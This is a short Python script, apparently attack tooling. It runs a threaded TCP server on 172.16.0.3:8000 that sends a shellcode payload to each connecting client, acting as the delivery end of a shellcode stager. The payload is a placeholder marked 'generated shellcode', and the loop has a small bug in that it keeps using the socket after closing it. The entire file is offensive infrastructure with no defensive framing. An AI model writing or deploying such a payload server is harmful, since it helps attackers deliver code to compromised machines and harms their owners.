#-*- coding=utf-8 -*-
import socket
import threading
import time  
#Written by Hacden 2020/03/22
def main():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('172.16.0.3', 8000))
		s.listen(20)
		timeout = 10
		socket.setdefaulttimeout(timeout)
	
		while True:
			sock, addr = s.accept()
			t = threading.Thread(target=tcplink, args=(sock, addr))
			t.start()
	except EOFError as e:
		pass

def tcplink(sock, addr):
    print('Start download shellcode %s:%s...' % addr)
    shellcode = b'生成的shellcode'	
    print("shellcode lenth is %d"%len(shellcode))
    while True:
        print(sock.recv(1024))
        time.sleep(3)
        sock.send(shellcode)
        sock.close()
    print('Finish %s:%s ' % addr)

if __name__ == '__main__':
    main()
